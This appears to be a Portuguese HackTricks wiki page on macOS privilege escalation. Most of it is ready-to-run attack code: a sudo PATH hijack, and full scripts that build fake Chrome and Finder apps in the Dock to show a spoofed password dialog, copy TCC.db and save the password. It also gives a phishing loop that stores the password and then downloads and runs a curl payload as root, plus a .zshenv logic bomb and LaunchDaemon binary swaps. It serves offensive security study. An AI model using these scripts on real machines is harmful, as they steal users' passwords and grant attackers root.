# Escalação de Privilégios no macOS

{{#include ../../banners/hacktricks-training.md}}

## Escalação de Privilégios via TCC

Se você veio aqui procurando por escalação de privilégios via TCC, acesse:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Muitas técnicas de escalação de privilégios que afetam o Linux ou outros sistemas semelhantes ao Unix também se aplicam ao macOS. Consulte:


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## Interação do Usuário

### Sudo Hijacking

Você pode encontrar a técnica original de [Sudo Hijacking dentro do post sobre Escalação de Privilégios no Linux](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking).

No entanto, o macOS **mantém** o **`PATH`** do usuário quando ele executa o **`sudo`**. Isso significa que outra forma de realizar esse ataque seria **sequestrar outros binários** que a vítima ainda executará ao **executar o sudo:**
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Observe que um usuário que utiliza o terminal provavelmente terá o **Homebrew instalado**. Portanto, é possível sequestrar binários em **`/opt/homebrew/bin`**.

### Dock Impersonation

Usando um pouco de **engenharia social**, você poderia **se passar, por exemplo, pelo Google Chrome** dentro do dock e, na prática, executar seu próprio script:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Algumas sugestões:

- Verifique no Dock se há um Chrome e, nesse caso, **remova** essa entrada e **adicione** a entrada do **Chrome falso** na **mesma posição** no array do Dock.

<details>
<summary>Chrome Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Algumas sugestões:

- Você **não pode remover o Finder do Dock**, portanto, se for adicioná-lo ao Dock, pode colocar o Finder falso bem ao lado do real. Para isso, é necessário **adicionar a entrada do Finder falso no início do array do Dock**.
- Outra opção é não colocá-lo no Dock e apenas abri-lo; "Finder solicitando controle do Finder" não é algo tão estranho.
- Outra opção para **escalar para root sem solicitar** a senha com uma caixa de diálogo horrível é fazer o Finder realmente solicitar a senha para executar uma ação privilegiada:
- Solicite ao Finder que copie para **`/etc/pam.d`** um novo arquivo **`sudo`** (o prompt solicitando a senha indicará que "o Finder quer copiar sudo")
- Solicite ao Finder que copie um novo **Authorization Plugin** (você pode controlar o nome do arquivo para que o prompt solicitando a senha indique que "o Finder quer copiar Finder.bundle")

<details>
<summary>Finder Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Password prompt phishing + sudo reuse

Malware frequentemente abusa da interação do usuário para **capturar uma senha com capacidade de sudo** e reutilizá-la programaticamente. Um fluxo comum:

1. Identifique o usuário conectado com `whoami`.
2. **Repita os prompts de senha** até que `dscl . -authonly "$user" "$pw"` retorne sucesso.
3. Armazene a credencial (por exemplo, `/tmp/.pass`) e execute ações privilegiadas com `sudo -S` (senha via stdin).

Exemplo de cadeia mínima:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
A senha roubada pode então ser reutilizada para **limpar a quarentena do Gatekeeper com `xattr -c`**, copiar LaunchDaemons ou outros arquivos privilegiados e executar estágios adicionais de forma não interativa.<sup>[[1]](#references)</sup>

## Vetores específicos do macOS mais recentes (2023–2026)

### `AuthorizationExecuteWithPrivileges` obsoleto ainda utilizável

`AuthorizationExecuteWithPrivileges` foi obsoleto na versão 10.7, mas **ainda funciona no Sonoma/Sequoia**. Muitos atualizadores comerciais invocam `/usr/libexec/security_authtrampoline` com um caminho não confiável. Se o binário-alvo for gravável pelo usuário, você pode implantar um trojan e aproveitar o prompt legítimo:
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
Combine com os **masquerading tricks acima** para apresentar um diálogo de senha convincente.


### Triagem de helper privilegiado / XPC

Muitos privescs modernos de terceiros no macOS seguem o mesmo padrão: um **LaunchDaemon root** expõe um **serviço Mach/XPC** a partir de **`/Library/PrivilegedHelperTools`**, então o helper não valida o cliente, valida-o **tarde demais** (race de PID) ou expõe um **método root** que utiliza um caminho/script **controlado pelo usuário**. Essa é a classe de bug por trás de muitas vulnerabilidades recentes em helpers de clientes VPN, game launchers e updaters.<sup>[[2]](#references)</sup>

Checklist rápido de triagem:
```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
echo "== $f =="
codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```
Preste atenção especial aos helpers que:

- continuam aceitando requisições **após a desinstalação** porque o job permaneceu carregado no `launchd`
- executam scripts ou leem configurações de **`/Applications/...`** ou de outros caminhos graváveis por usuários não-root
- dependem de validação de peer baseada em **PID** ou apenas em **bundle-id**, que pode ser explorável por race condition

Para obter mais detalhes sobre bugs de autorização em helpers, consulte [esta página](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md).

### Herança de ambiente de scripts do PackageKit (CVE-2024-27822)

Até a Apple corrigir o problema no **Sonoma 14.5**, **Ventura 13.6.7** e **Monterey 12.7.5**, instalações iniciadas pelo usuário via **`Installer.app`** / **`PackageKit.framework`** podiam executar **scripts PKG como root dentro do ambiente do usuário atual**. Isso significa que um pacote que usasse **`#!/bin/zsh`** carregaria o **`~/.zshenv`** do atacante e o executaria como **root** quando a vítima instalasse o pacote.<sup>[[3]](#references)</sup>

Isso é especialmente interessante como uma **logic bomb**: você precisa apenas de um foothold na conta do usuário e de um arquivo de inicialização do shell gravável; depois, aguarda a execução, pelo usuário, de qualquer installer vulnerável baseado em **zsh**. Isso geralmente não se aplica a deployments de **MDM/Munki**, pois eles são executados dentro do ambiente do usuário root.<sup>[[3]](#references)</sup>
```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```
Se quiser uma análise mais aprofundada sobre abuso específico de installers, consulte também [esta página](macos-files-folders-and-binaries/macos-installers-abuse.md).

### Colisão do destino do Installer via `.localized`

Alguns installers de terceiros registram um LaunchDaemon de root cujo executável é referenciado por um caminho fixo dentro de `/Applications/Target.app`. Se um atacante puder criar esse bundle primeiro com um **identificador de bundle diferente**, o Installer poderá preservar o chamariz e colocar o app real em `/Applications/Target.localized/Target.app`. O daemon continuará apontando para o caminho original. Portanto, um executável controlado pelo atacante dentro do bundle chamariz poderá ser executado posteriormente como root.<sup>[[8]](#references)</sup>

As pré-condições importantes são:<sup>[[8]](#references)</sup>

1. O atacante pode criar ou controlar o caminho esperado do app.
2. O package não remove o bundle conflitante.
3. O job privilegiado usa um caminho hard-coded dentro desse bundle.
4. O usuário ou um workflow de MDM instala o package e registra o job.

Procure bundles relocados e, em seguida, revise os destinos dos LaunchDaemons usando o loop de enumeração na próxima seção:<sup>[[8]](#references)</sup>
```bash
find /Applications -type d -name '*.localized' -prune -print
for app in /Applications/*.app; do
[ -d "$app" ] && stat -f '%Su:%Sg %Sp %N' "$app"
done
```
Um instalador mais seguro resolve a localização final do bundle e mantém os executáveis privilegiados em um local pertencente ao root, como `/Library/PrivilegedHelperTools`. Ele também deve verificar a propriedade e a assinatura de código antes de registrar ou iniciar o job.<sup>[[8]](#references)</sup>

### Hijacking de um alvo gravável do LaunchDaemon

Um plist do LaunchDaemon pode pertencer ao root enquanto sua entrada `Program` ou a primeira entrada de `ProgramArguments` aponta para um diretório gravável pelo usuário. Verifique o **caminho inteiro**, não apenas as permissões do executável. Se o diretório pai for gravável, um atacante poderá renomear um executável pertencente ao root e criar um substituto no mesmo caminho. O substituto será executado como root na próxima vez que o job for iniciado. Uma reinicialização ou um reinício normal do serviço é suficiente. O atacante não precisa de permissão para executar `launchctl bootstrap` no domínio do sistema.<sup>[[7]](#references)</sup>

Enumere primeiro cada alvo e seu diretório pai imediato:<sup>[[7]](#references)</sup>
```bash
for p in /Library/LaunchDaemons/*.plist; do
target=$(plutil -extract Program raw -o - "$p" 2>/dev/null)
[ -n "$target" ] ||
target=$(plutil -extract ProgramArguments.0 raw -o - "$p" 2>/dev/null)
[ -n "$target" ] || continue
printf '\n%s -> %s\n' "$p" "$target"
ls -ld "$target" "$(dirname "$target")" 2>/dev/null
done
```
Quando o arquivo ou seu diretório pai for gravável, preserve o binário original e substitua o caminho por um payload executável. Em seguida, aguarde o daemon já carregado reiniciar.<sup>[[7]](#references)</sup>
```bash
target=/path/from/the/plist
mv "$target" "$target.real"
cp /tmp/payload "$target"
chmod 755 "$target"
```
### XNU SMR credential-pointer race (CVE-2025-24118)

O path vulnerável `kauth_cred_proc_update` atualizava `proc_ro.p_ucred` com a API não atômica `zalloc_ro_mut`, enquanto os leitores SMR carregavam o ponteiro sem um lock. O trigger público usa um binário setgid especialmente preparado. Uma thread alterna entre seus IDs de grupo real e efetivo, enquanto outra thread entra repetidamente em um syscall como `getgid()`.<sup>[[4]](#references)</sup>
```c
// Writer thread inside a setgid binary
while (1) {
setgid(real_gid);
setgid(effective_gid);
}
// Reader thread
while (1) observed_gid = getgid();
```
Trate isso como uma **race primitive**, não como um root exploit pronto. O PoC publicado demonstra um ponteiro de credencial corrompido. Normalmente, isso termina em um kernel panic. O pesquisador reproduziu a corrupção apenas em sistemas Intel e não forneceu controle determinístico do objeto de credencial resultante. A Apple alterou a atualização para uma troca atômica de ponteiro no macOS 15.3.<sup>[[4]](#references)</sup>

### SIP bypass via Migration assistant ("Migraine", CVE-2023-32369)

Se você já possui root, o SIP ainda bloqueia gravações em locais do sistema. O bug **Migraine** abusa do entitlement `com.apple.rootless.install.heritable` do Migration Assistant para iniciar um processo filho que herda o SIP bypass e sobrescreve caminhos protegidos (por exemplo, `/System/Library/LaunchDaemons`).<sup>[[5]](#references)</sup> A cadeia:

1. Obtenha root em um sistema em execução.
2. Acione o `systemmigrationd` com um estado criado para executar um binary controlado pelo atacante.
3. Use o entitlement herdado para modificar arquivos protegidos pelo SIP, mantendo a persistência mesmo após a reinicialização.

### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class)

Vários daemons da Apple aceitam objetos **NSPredicate** via XPC e validam apenas o campo `expressionType`, que é controlado pelo atacante. Ao criar um predicate que avalia selectors arbitrários, é possível obter **code execution em serviços XPC root/system** (por exemplo, `coreduetd`, `contextstored`). Quando combinado com um sandbox escape inicial de um app, isso concede **privilege escalation sem prompts ao usuário**. Procure endpoints XPC que desserializam predicates e não possuem um visitor robusto.<sup>[[6]](#references)</sup>

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Qualquer usuário** (mesmo sem privilégios) pode criar e montar um snapshot do Time Machine com `-o noowners` e **acessar TODOS os arquivos** desse snapshot, contornando as verificações de ownership no volume ativo. O único privilégio necessário é que o aplicativo utilizado (como o `Terminal`) tenha **Full Disk Access** (`kTCCServiceSystemPolicyAllfiles`).

Os comandos e a explicação completa estão na página de TCC bypasses:

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## Informações Sensíveis

Isso pode ser útil para realizar privilege escalation:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}



## References

- [1] [Pentest Partners - 2025, o ano do Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [CVE-2024-30165: Local Privilege Escalation do AWS Client VPN para macOS](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
- [3] [CVE-2024-27822: Privilege Escalation do macOS PackageKit](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [4] [TRAVERTINE: CVE-2025-24118](https://jprx.io/cve-2025-24118/)
- [5] [SIP bypass do Microsoft "Migraine" (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [6] [Trellix Advanced Research Center - Uma nova classe de bug de Privilege Escalation no macOS e iOS (CVE-2023-23530/23531)](https://www.trellix.com/en-sg/blogs/research/trellix-advanced-research-center-discovers-a-new-privilege-escalation-bug-class-on-macos-and-ios/)
- [7] [Hijacking de LaunchDaemon: privilege escalation e persistência via permissões inseguras de pastas](https://bradleyjkemp.dev/post/launchdaemon-hijacking/)
- [8] [macOS LPE via o diretório .localized](https://theevilbit.github.io/posts/localized/)
{{#include ../../banners/hacktricks-training.md}}
